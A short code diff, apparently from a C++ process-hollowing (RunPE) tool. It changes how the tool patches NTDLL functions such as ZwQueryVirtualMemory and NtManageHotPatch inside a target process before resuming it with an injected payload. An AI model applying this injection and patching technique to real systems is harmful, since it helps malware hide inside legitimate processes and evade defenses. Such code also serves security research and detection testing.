@@ -231,7 +231,7 @@ bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi, 
         std::cerr << "Redirecting failed!\n";
         return false;
     }
-    if (!is32bit && g_PatchRequired && !apply_ntdll_patch64(pi.hProcess, remoteBase)) {
+    if (!is32bit && g_PatchRequired && !patch_ZwQueryVirtualMemory(pi.hProcess, remoteBase)) {
         std::cout << "ERROR: failed to apply the required patch on NTDLL\n";
     }
     std::cout << "Resuming the process: " << std::dec << pi.dwProcessId << std::endl;
@@ -310,7 +310,11 @@ bool run_pe(IN LPCTSTR payloadPath, IN LPCTSTR targetPath, IN LPCTSTR cmdLine)
         free_pe_buffer(loaded_pe, payloadImageSize);
         return false;
     }
-    
+#ifndef _WIN64
+    patch_NtManageHotPatch32(pi.hProcess);
+#else
+    patch_NtManageHotPatch64(pi.hProcess);
+#endif
     //3. Perform the actual RunPE:
     bool isOk = _run_pe(loaded_pe, payloadImageSize, pi, is32bit_payload);
     //4. Cleanup:
